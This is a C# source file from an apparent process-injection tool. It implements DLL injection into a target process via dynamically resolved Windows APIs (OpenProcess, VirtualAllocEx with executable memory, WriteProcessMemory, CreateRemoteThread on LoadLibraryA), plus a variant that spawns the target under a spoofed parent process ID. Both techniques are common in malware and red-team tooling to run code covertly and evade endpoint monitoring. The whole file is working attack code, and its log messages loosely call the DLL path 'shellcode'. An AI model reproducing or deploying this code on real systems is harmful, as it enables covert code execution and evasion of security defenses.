using ProcessInjection.DInvoke.Native;
using System;
using System.Runtime.InteropServices;
using static ProcessInjection.Utils.Utils;

namespace ProcessInjection.DInvoke
{
    public class DLLInjection
    {
        public static void DynamicDLLInject(int pid, byte[] buf)
        {
            uint lpNumberOfBytesWritten = 0;
            uint lpThreadId = 0;
            try
            {
                PrintInfo($"[+] Obtaining the handle for the process id {pid}.");
                var funcParams = new object[] {
                    (uint)DInvoke.Native.Enum.ProcessAccessRights.All,
                    false,
                    (uint)pid
                };

                var pHandle = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "OpenProcess",
                    typeof(DInvoke.Native.Delegates.OpenProcess),
                    ref funcParams,
                    true);

                PrintInfo($"[+] Handle {pHandle} opened for the process id {pid}.");

                var pointer = DInvoke.Native.DynamicInvoke.GetLibraryAddress("kernel32.dll", "GetProcAddress");
                var GetProcAddress = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DInvoke.Native.Delegates.GetProcAddress)) as DInvoke.Native.Delegates.GetProcAddress;

                pointer = DInvoke.Native.DynamicInvoke.GetLibraryAddress("kernel32.dll", "GetModuleHandleA");
                var GetModuleHandleA = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DInvoke.Native.Delegates.GetModuleHandleA)) as DInvoke.Native.Delegates.GetModuleHandleA;

                IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

                PrintInfo($"[!] {loadLibraryAddr} is the address of the LoadLibraryA exported function.");


                PrintInfo($"[!] Allocating memory for the DLL path.");

                funcParams = new object[] {
                    pHandle,
                    IntPtr.Zero,
                    (uint)buf.Length,
                    (uint)DInvoke.Native.Enum.MemAllocation.MEM_RESERVE | (uint)DInvoke.Native.Enum.MemAllocation.MEM_COMMIT,
                    (uint)DInvoke.Native.Enum.MemProtect.PAGE_EXECUTE_READWRITE
                };

                var rMemAddress = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "VirtualAllocEx",
                    typeof(DInvoke.Native.Delegates.VirtualAllocEx),
                    ref funcParams,
                    true);

                PrintInfo($"[!] Memory for injecting DLL path is allocated at 0x{rMemAddress}.");

                PrintInfo($"[!] Writing the DLL path at the allocated memory location.");


                funcParams = new object[] {
                    pHandle,
                    rMemAddress,
                    buf,
                    (uint)buf.Length,
                    lpNumberOfBytesWritten
                };

                var status = (bool)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "WriteProcessMemory",
                    typeof(DInvoke.Native.Delegates.WriteProcessMemory),
                    ref funcParams,
                    true);

                if (status)
                {
                    PrintInfo($"[+] Shellcode written in the process memory.");
                    PrintInfo($"[+] Creating remote thread to execute the shellcode.");


                    funcParams = new object[] {
                    pHandle,
                    IntPtr.Zero,
                    (uint)0,
                    loadLibraryAddr,
                    rMemAddress,
                    (uint)0,
                    (uint)lpThreadId
                    };

                    var hRemoteThread = (IntPtr)DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                        "kernel32.dll",
                        "CreateRemoteThread",
                        typeof(DInvoke.Native.Delegates.CreateRemoteThread),
                        ref funcParams,
                        true);

                    PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                }
                else
                {
                    PrintError($"[+] Failed to write the shellcode into the memory of the process id {pid}.");
                }

                funcParams = new object[] {
                    pHandle
                    };

                var closed = DInvoke.Native.DynamicInvoke.DynamicApiInvoke(
                    "kernel32.dll",
                    "CloseHandle",
                    typeof(DInvoke.Native.Delegates.CloseHandle),
                    ref funcParams,
                    true);
            }
            catch (Exception ex)
            {
                PrintError("[-] " + Marshal.GetExceptionCode());
                PrintError(ex.Message);
            }
        }

        public static void PPIDDynDLLInject(string binary, byte[] shellcode, int parentpid)
        {
            DynamicPPIDSpoofing Parent = new DynamicPPIDSpoofing();
            Structs.PROCESS_INFORMATION pinf = Parent.DynamicParentSpoofing(parentpid, binary);
            DynamicDLLInject(pinf.dwProcessId, shellcode);
        }
    }
}

